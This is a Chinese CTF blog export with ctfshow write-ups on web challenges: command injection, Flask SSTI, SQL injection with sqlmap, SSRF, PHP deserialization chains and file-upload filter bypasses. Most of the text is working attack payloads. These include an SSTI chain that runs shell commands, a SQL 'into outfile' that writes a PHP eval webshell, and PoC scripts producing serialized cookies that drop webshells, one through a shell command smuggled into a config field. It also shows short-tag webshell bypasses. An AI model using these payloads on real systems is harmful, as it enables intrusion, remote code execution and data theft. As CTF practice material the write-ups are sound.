<h2 id="easyPHP"><a href="#easyPHP" class="headerlink" title="easyPHP"></a>easyPHP</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line"><span class="variable">$param</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;param&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$param</span>))&#123;</span><br><span class="line">    <span class="variable">$cmd</span>=<span class="title function_ invoke__">escapeshellcmd</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$cmd</span>,<span class="number">0</span>,<span class="number">3</span>)).<span class="string">&quot; &quot;</span>.<span class="title function_ invoke__">escapeshellarg</span>(<span class="variable">$param</span>).<span class="string">&quot; &quot;</span>.<span class="keyword">__FILE__</span>;</span><br><span class="line">    <span class="title function_ invoke__">shell_exec</span>(<span class="variable">$cmd</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>学习两个新的命令</p>
<p>sed</p>
<p>awk</p>
<h1 id="内部赛"><a href="#内部赛" class="headerlink" title="内部赛"></a>内部赛</h1><h2 id="出题人不想跟你说话-jpg"><a href="#出题人不想跟你说话-jpg" class="headerlink" title="出题人不想跟你说话.jpg"></a>出题人不想跟你说话.jpg</h2><p>打开蚁剑连接密码是cai，连接后反弹shell，根据提示查看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cat /etc/crontab</span><br></pre></td></tr></table></figure>

<p> 这个文件放一些定时任务</p>
<p><img src="/2023/05/22/ctfshow%E5%90%88%E9%9B%86-ctfshow/QQ%E6%88%AA%E5%9B%BE20230807224959.png"></p>
<p>nginx 本地提权</p>
<h2 id="蓝瘦"><a href="#蓝瘦" class="headerlink" title="蓝瘦"></a>蓝瘦</h2><p>查看源码，可以看到key param</p>
<p>flask session 伪造,登录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&#x27;catch_warnings&#x27; %&#125;&#123;&#123; c.__init__.__globals__[&#x27;__builtins__&#x27;].eval(&quot;__import__(&#x27;os&#x27;).popen(&#x27;env&#x27;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>

<h2 id="签退"><a href="#签退" class="headerlink" title="签退"></a>签退</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a;system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?S=a=system(&#x27;cat ../../flag.txt&#x27;);</span><br></pre></td></tr></table></figure>



<h2 id="登录就有flag"><a href="#登录就有flag" class="headerlink" title="登录就有flag"></a>登录就有flag</h2><p>分号可以用于闭合，井号可以用于注释，^进行异或运算，等号就是判等，这里需要利用sql的一个点“mysql弱类型转换”，<strong>空异或0会查到所有非数字开头的记录</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27;^0#</span><br><span class="line">&#x27;^&#x27;&#x27;#</span><br></pre></td></tr></table></figure>

<h1 id="WEB-AK赛"><a href="#WEB-AK赛" class="headerlink" title="WEB AK赛"></a>WEB AK赛</h1><h2 id="web1-观字"><a href="#web1-观字" class="headerlink" title="web1_观字"></a>web1_观字</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">#flag in http://192.168.7.68/flag</span><br><span class="line">if(isset($_GET[&#x27;url&#x27;]))&#123;</span><br><span class="line">    $url = $_GET[&#x27;url&#x27;];</span><br><span class="line">    $protocol = substr($url, 0,7);</span><br><span class="line">    if($protocol!=&#x27;http://&#x27;)&#123;</span><br><span class="line">        die(&#x27;仅限http协议访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    if(preg_match(&#x27;/\.|\;|\||\&lt;|\&gt;|\*|\%|\^|\(|\)|\#|\@|\!|\`|\~|\+|\&#x27;|\&quot;|\.|\,|\?|\[|\]|\&#123;|\&#125;|\!|\&amp;|\$|0/&#x27;, $url))&#123;</span><br><span class="line">        die(&#x27;仅限域名地址访问&#x27;);</span><br><span class="line">    &#125;</span><br><span class="line">    system(&#x27;curl &#x27;.$url);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>curl可以用句号<code>。</code>代替点<code>.</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=http://192。168。7。68/flag</span><br></pre></td></tr></table></figure>

<p>URL跳转限制</p>
<p><a href="https://www.cnblogs.com/-mo-/p/11636051.html">https://www.cnblogs.com/-mo-/p/11636051.html</a></p>
]]></content>
  </entry>
  <entry>
    <title>ctfshow代码审计</title>
    <url>/2023/03/16/ctfshow%E5%90%88%E9%9B%86-ctfshow%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    <content><![CDATA[<p>代码审计</p>
  <span id="more"></span>


<h2 id="web301"><a href="#web301" class="headerlink" title="web301"></a>web301</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>]:<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$username</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userid&#x27;</span>];</span><br><span class="line"><span class="variable">$userpwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;userpwd&#x27;</span>];</span><br><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;select sds_password from sds_user where sds_username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27; order by id limit 1;&quot;</span>;</span><br><span class="line"><span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);<span class="comment">//在 PHP 中，有两种常用接口用于连接 MySQL 数据库并与之交互：`mysqli`和`PDO`.</span></span><br><span class="line"><span class="variable">$row</span>=<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch_array</span>(MYSQLI_BOTH);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$result</span>-&gt;num_rows&lt;<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strcasecmp</span>(<span class="variable">$userpwd</span>,<span class="variable">$row</span>[<span class="string">&#x27;sds_password&#x27;</span>]))&#123;</span><br><span class="line">	<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]=<span class="number">1</span>;</span><br><span class="line">	<span class="variable">$result</span>-&gt;<span class="title function_ invoke__">free</span>();</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">	<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:index.php&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;error&#x27;</span>]=<span class="string">&quot;1&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>源码下载地址<a href="https://ctfshow.lanzoui.com/ilMPgjfeyxa">https://ctfshow.lanzoui.com/ilMPgjfeyxa</a></p>
<p>使用<code>mysqli</code>，您可以执行所有常见的数据库操作，例如查询、插入、更新和删除数据。</p>
<p>解法一payload：</p>
<p>1’ union select 1# ‘;</p>
<p>1；原理如下</p>
<p><a href="https://blog.csdn.net/q20010619/article/details/120592532">(10条消息) CTFshow刷题日记-WEB-代码审计(web301-310)SQL注入、SSRF打MySQL、SSRF打FastCGI、SSRF文件读取_ctfshow web303_OceanSec的博客-CSDN博客</a></p>
<p>解法二sqlmap</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --dump --forms --batch</span><br></pre></td></tr></table></figure>

<p>  checklogin.php 源码如下，能跑但只能跑</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$username=$_POST[&#x27;userid&#x27;];</span><br><span class="line">$userpwd=$_POST[&#x27;userpwd&#x27;];</span><br><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br><span class="line">$result=$mysqli-&gt;query($sql);</span><br></pre></td></tr></table></figure>

<p>forms 选择post 传参，batch选择自动yes</p>
<p>由于上面跑的太慢也可以选择sql 6连</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --current-db</span><br><span class="line">//跑出数据库sds</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --tables -D &quot;sds&quot;</span><br><span class="line">//跑出表 sds_user</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://a17db188-9423-4e2a-93a0-441830d878d6.challenge.ctf.show/checklogin.php --forms --batch --columns  -T &quot;sds_user&quot; -D &quot;sds&quot;   </span><br></pre></td></tr></table></figure>

<p> 跑出字段</p>
<p>sds_password<br> sds_username </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u http://f922feab-0cee-4250-bf07-c4fe567b6974.challenge.ctf.show/checklogin.php --forms --batch --dump  -T &quot;sds_user&quot; -D &quot;sds&quot; -C &quot;sds_password&quot; </span><br></pre></td></tr></table></figure>

<p>跑出密码：ctfshowwwww    登陆即可</p>
<p>解法三</p>
<p>username</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1&#x27; union select &#x27;&lt;?php eval($_POST[1]);?&gt;&#x27; into outfile &#x27;/var/www/html/1.php&#x27;#</span><br></pre></td></tr></table></figure>

<p>passwd&#x3D;1</p>
<p>访问url&#x2F;1.php </p>
<p>蚁剑连接</p>
<p><a href="https://blog.csdn.net/zhengxijia2012/article/details/73437376?ops_request_misc=%7B%22request_id%22:%22167894875516800225569050%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=167894875516800225569050&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~baidu_landing_v2~default-2-73437376-null-null.142%5Ev73%5Epc_new_rank,201%5Ev4%5Eadd_ask,239%5Ev2%5Einsert_chatgpt&utm_term=$_SESSION&spm=1018.2226.3001.4187">(10条消息) php之$_SESSION的理解_php $_session_友缘聚友的博客-CSDN博客</a></p>
<p>ctfshow{7623027b-8b89-4757-8f8f-5f10d6a87c1b}</p>
<h2 id="web302"><a href="#web302" class="headerlink" title="web302"></a>web302</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">if(!strcasecmp(sds_decode($userpwd),$row[&#x27;sds_password&#x27;]))&#123;</span><br></pre></td></tr></table></figure>

<p>下载后源码后wp不符，按wp的来</p>
<p>登录时判断了被 sds_decode() 处理后的密码是否和查询出来的密码一致</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sds_decode</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>.<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;sds&quot;</span>))).<span class="string">&quot;sds&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>上题解法一用不了了</p>
<p>可以</p>
<p>上题payload写shell依旧能用</p>
<p>ctfshow{b85b90e6-b5cc-46c1-93e2-1c421de498a0}</p>
<h2 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h2><p>在sql查询之前加入了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$username</span>)&gt;<span class="number">6</span>)&#123;</span><br><span class="line">	<span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但试了试，admin,admin即可进入。</p>
<p>审计源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">require</span> <span class="string">&#x27;conn.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]))&#123;</span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;location:login.php&quot;</span>);</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">	<span class="comment">//注入点</span></span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]=!<span class="keyword">empty</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>])?<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>]:<span class="literal">NULL</span>;</span><br><span class="line">	<span class="variable">$dpt_name</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_name&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_address</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_address&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_build_year</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_build_year&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_has_cert</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_has_cert&#x27;</span>]==<span class="string">&quot;on&quot;</span>?<span class="string">&quot;1&quot;</span>:<span class="string">&quot;0&quot;</span>;</span><br><span class="line">	<span class="variable">$dpt_cert_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_cert_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$dpt_telephone_number</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;dpt_telephone_number&#x27;</span>];</span><br><span class="line">	<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="string">&quot;set names utf-8&quot;</span>);</span><br><span class="line">	<span class="variable">$sql</span>=<span class="string">&quot;insert into sds_dpt set sds_name=&#x27;&quot;</span>.<span class="variable">$dpt_name</span>.<span class="string">&quot;&#x27;,sds_address =&#x27;&quot;</span>.<span class="variable">$dpt_address</span>.<span class="string">&quot;&#x27;,sds_build_date=&#x27;&quot;</span>.<span class="variable">$dpt_build_year</span>.<span class="string">&quot;&#x27;,sds_have_safe_card=&#x27;&quot;</span>.<span class="variable">$dpt_has_cert</span>.<span class="string">&quot;&#x27;,sds_safe_card_num=&#x27;&quot;</span>.<span class="variable">$dpt_cert_number</span>.<span class="string">&quot;&#x27;,sds_telephone=&#x27;&quot;</span>.<span class="variable">$dpt_telephone_number</span>.<span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">	<span class="variable">$result</span>=<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$sql</span>;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$result</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">		<span class="variable">$mysqli</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:dpt.php&quot;</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$mysqli</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	 &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>既然都说是注入点了，注入一下试试。</p>
<h2 id="web305"><a href="#web305" class="headerlink" title="web305"></a>web305</h2><p>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$this</span>-&gt;username, <span class="variable">$this</span>-&gt;password);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注入点在checklogin.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$user_cookie</span> = <span class="variable">$_COOKIE</span>[<span class="string">&#x27;user&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$user_cookie</span>))&#123;</span><br><span class="line">	<span class="variable">$user</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$user_cookie</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>反序列化写脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class user&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public function __construct($u, $p)&#123;</span><br><span class="line">        $this-&gt;username = $u;</span><br><span class="line">        $this-&gt;password = $p;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$s = new user(&#x27;shell.php&#x27;,&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;);</span><br><span class="line">echo urlencode(serialize($s));</span><br></pre></td></tr></table></figure>

<p>run</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">O%3A4%3A%22user%22%3A2%3A%7Bs%3A8%3A%22username%22%3Bs%3A9%3A%22shell.php%22%3Bs%3A8%3A%22password%22%3Bs%3A24%3A%22%3C%3Fphp+eval%28%24_POST%5B1%5D%29%3B%3F%3E%22%3B%7D</span><br></pre></td></tr></table></figure>

<p>蚁剑连接数据库，</p>
<p>数据库地址：locahost:3306</p>
<p>用户密码 root root ,文件下载后密码是phpcj,这个是错的，应该还没来得及改</p>
<p>打开后在sds库里看见flag</p>
<h2 id="web306"><a href="#web306" class="headerlink" title="web306"></a>web306</h2><p>找到写文件函数，继续找调用close()函数的类</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class log&#123;</span><br><span class="line">	public $title=&#x27;log.txt&#x27;;</span><br><span class="line">	public $info=&#x27;&#x27;;</span><br><span class="line">	public function loginfo($info)&#123;</span><br><span class="line">		$this-&gt;info=$this-&gt;info.$info;</span><br><span class="line">	&#125;</span><br><span class="line">	public function close()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个类里面还含有可调用的__construct()</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">class dao&#123;</span><br><span class="line">	private $config;</span><br><span class="line">	private $conn;</span><br><span class="line"></span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">		$this-&gt;init();</span><br><span class="line">	&#125;</span><br><span class="line">	private function init()&#123;</span><br><span class="line">		$this-&gt;conn=new mysqli($this-&gt;config-&gt;get_mysql_host(),$this-&gt;config-&gt;get_mysql_username(),$this-&gt;config-&gt;get_mysql_password(),$this-&gt;config-&gt;get_mysql_db());</span><br><span class="line">	&#125;</span><br><span class="line">	public function __destruct()&#123;</span><br><span class="line">		$this-&gt;conn-&gt;close();</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>search unserialize</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$user = unserialize(base64_decode($_COOKIE[&#x27;user&#x27;]));</span><br><span class="line">if($user)&#123;</span><br><span class="line">	header(&quot;location:index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>poc脚本，</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $conn;</span><br><span class="line"></span><br><span class="line">    public function __construct()&#123;</span><br><span class="line">        $this-&gt;conn=new log();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">class log&#123;</span><br><span class="line">    public $title=&#x27;a.php&#x27;;</span><br><span class="line">    public $info=&#x27;&lt;?php eval($_POST[1]);?&gt;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">$a=new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>cookie传参到index.php</p>
<p>访问a.php即可</p>
<h2 id="web307"><a href="#web307" class="headerlink" title="web307"></a>web307</h2><p>search file_put_contents</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function closelog()&#123;</span><br><span class="line">		file_put_contents($this-&gt;title, $this-&gt;info);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>但是没搜到closelog</p>
<p>所以用不了，换命令执行幻术</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">system()</span><br><span class="line">exec()</span><br><span class="line">shell_exec()</span><br><span class="line">passthru()</span><br><span class="line">pcntl_exec()</span><br><span class="line">popen()</span><br><span class="line">proc_open()</span><br></pre></td></tr></table></figure>

<p>找到了shell_exec，在dao.php中</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function  clearCache()&#123;</span><br><span class="line">		shell_exec(&#x27;rm -rf ./&#x27;.$this-&gt;config-&gt;cache_dir.&#x27;/*&#x27;);</span><br><span class="line">	&#125;</span><br></pre></td></tr></table></figure>

<p>搜索一下clearCache，在service.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public function clearCache()&#123;</span><br><span class="line">	$this-&gt;dao-&gt;clearCache();</span><br></pre></td></tr></table></figure>

<p>看到在logout.php</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$service = unserialize(base64_decode($_COOKIE[&#x27;service&#x27;]));</span><br><span class="line">if($service)&#123;</span><br><span class="line">	$service-&gt;clearCache();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在这里传参</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://d8c4084b-f6f8-423c-b148-752d4b81eef8.challenge.ctf.show/controller/logout.php</span><br></pre></td></tr></table></figure>

<p>我试了试火狐的hackbar不是很好用，cookie传参穿了好久都没进去。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class config&#123;</span><br><span class="line">    public $cache_dir = &#x27;;echo \&#x27;&lt;?php eval($_POST[1]);?&gt;\&#x27; &gt; 1.php;&#x27;;</span><br><span class="line">&#125;</span><br><span class="line">class dao&#123;</span><br><span class="line">    private $config;</span><br><span class="line">	public function __construct()&#123;</span><br><span class="line">		$this-&gt;config=new config();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a = new dao();</span><br><span class="line">echo base64_encode(serialize($a));</span><br></pre></td></tr></table></figure>

<p>同样生成的1.php也在controller下</p>
<p>payload：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">service=TzozOiJkYW8iOjE6e3M6MTE6IgBkYW8AY29uZmlnIjtPOjY6ImNvbmZpZyI6MTp7czo5OiJjYWNoZV9kaXIiO3M6NDE6IjtlY2hvICc8P3BocCBldmFsKCRfUE9TVFsxXSk7Pz4nID4gMS5waHA7Ijt9fQ==</span><br></pre></td></tr></table></figure>

<p>ctfshow{b1869c93-377b-4431-8257-c7475286bb2e}</p>
]]></content>
      <categories>
        <category>ctfshow</category>
      </categories>
      <tags>
        <tag>ctfshow</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow文件上传</title>
    <url>/2023/02/15/ctfshow%E5%90%88%E9%9B%86-ctfshow%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/</url>
    <content><![CDATA[<p>  文件上传</p>
 <span id="more"></span>

<p>绕过&lt;?  用</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>]);&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p>后缀改为 phtml</p>
<h2 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h2><p><a href="https://blog.csdn.net/miuzzx/article/details/109537262">(9条消息) CTFSHOW文件上传篇_ctfshow web162_yu22x的博客-CSDN博客</a></p>
<p>php断标签绕过</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=(表达式)?&gt;  等价于 &lt;?php echo (表达式)?&gt;</span><br><span class="line">&lt;?=eval($_POST[1])?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h2><p>过滤了[],用花括号代替</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?=eval($_POST&#123;1&#125;)?&gt;</span><br></pre></td></tr></table></figure>

<h2 id="web157-158-159"><a href="#web157-158-159" class="headerlink" title="web157,158,159"></a>web157,158,159</h2><p>创建一个**.user.ini.png**</p>
